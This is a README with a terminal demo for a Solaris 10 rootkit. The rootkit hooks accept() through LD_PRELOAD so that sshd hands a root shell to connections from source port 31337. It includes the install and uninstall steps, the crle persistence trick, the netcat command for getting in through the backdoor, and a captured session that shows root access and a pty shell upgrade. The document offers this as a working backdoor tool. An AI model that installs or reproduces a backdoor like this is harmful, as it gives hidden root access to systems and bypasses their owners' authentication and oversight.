Solaris 10.x LD_PRELOAD sshd accept() rootkit

By: c papathanasiou  

Functionality:

We hijack the libc accept() call via LD_PRELOAD and yield back a 
non-interactive shell on the remote host. 

The .so file is placed under the trusted library path. 

This has been written to specifically target sshd on Solaris, although
other daemons (bind, sendmail, apached) can also be targeted. 

Installation:

To install -> `make all`

To uninstall -> `make clean`

To come in via the backdoor -> `nc -v -p 31337 remote-host 22`


---------------------------------------------------------------------

# make all

Installing Solaris LD_PRELOAD sshd accept() backdoor

Removing references to accept()..
Done
Compiling...
Done
Moving libhij.so to /lib/secure
Disabling ssh..
Done
Running crle to set LD_PRELOAD environment..
Done
Enabling ssh
Trojaned!!
# nc -v -p 31337 localhost 22
localhost [127.0.0.1] 22 (ssh) open
id
uid=0(root) gid=0(root)
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.00# uname -a
uname -a
SunOS unknown 5.10 Generic_137138-09 i86pc i386 i86pc
bash-3.00#

To uninstall: 

# make clean
Restarting ssh daemon...
rootkit removed..
# nc -v -p 31337 localhost 22
localhost [127.0.0.1] 22 (ssh) open
SSH-2.0-Sun_SSH_1.1
^CExiting.
#


---------------------------------------------------------------------
References:


[1] Halflife's paper: Phrack Magazine   Volume 7, Issue 51 September 
01, 1997

[2] Dynamic linker http://en.wikipedia.org/wiki/Dynamic_linker

[3] Toshihiro Tabata, K.S. Design of Intrusion Detection System at 
User Level with System-Call Interposing. in 1st International Conference
on E-Business and Telecommunication Networks. 2004. Portugal.

[4] Reverse Engineering with LD_PRELOAD 
http://securityvulns.com/articles/reveng/

[5] Benjamin A. Kuperman, E.S., Generation of Application Level Audit Data via Library Interposition (Technical Report). 1999, Purdue University, COAST Laboratory.

Links:

 http://www.phrack.org/issues.html?issue=54&id=10#article
 http://www.phrack.org/issues.html?issue=56&id=7#article
